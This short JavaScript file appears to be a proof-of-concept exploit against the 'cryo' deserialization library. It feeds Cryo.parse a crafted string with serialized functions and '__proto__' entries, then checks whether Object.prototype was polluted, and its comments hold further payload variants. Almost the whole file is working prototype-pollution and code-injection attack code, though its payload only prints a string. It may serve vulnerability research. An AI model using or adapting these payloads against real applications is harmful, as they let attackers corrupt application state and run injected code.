var Cryo = require("cryo");
var frozen =
  '{"root":"_CRYO_REF_3","references":[{"contents":{},"value":"_CRYO_FUNCTION_function () {console.log(\\"defconrussia\\"); return 1111;}"},{"contents":{},"value":"_CRYO_FUNCTION_function () {console.log(\\"defconrussia\\");return 2222;}"},{"contents":{"__proto__":"polluted","valueOf":"yes"},"value":"_CRYO_OBJECT_"},{"contents":{"__proto__":"polluted"},"value":"yes"}]}';
// let frozen1 = '{"add": "console.log(this.constructor.prototype.polluted=`yes`)"}'
var hydrated = Cryo.parse(frozen);
console.log(hydrated);
// console.log({}.polluted)

// const malicious_payload = '{"Object.prototype":{"polluted":"yes"}}';

// var hydrated = Cryo.parse(malicious_payload);
// console.log(hydrated);
console.log({}.polluted);

//  copyProps(JSON.parse(malicious_payload), {});
